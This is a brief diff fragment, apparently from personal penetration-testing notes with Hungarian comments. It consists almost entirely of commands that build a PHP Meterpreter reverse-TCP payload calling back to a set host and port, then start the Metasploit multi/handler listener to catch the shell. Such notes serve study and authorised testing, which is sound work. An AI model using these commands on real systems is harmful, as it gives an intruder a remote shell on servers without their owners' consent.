@@ -80,3 +80,4 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f raw > mets
 msfconsole > use exploit/multi/handler // ez csak listener 
 set payload php/meterpreter/reverse_tcp
 run // olyan mint a netcates listener
+
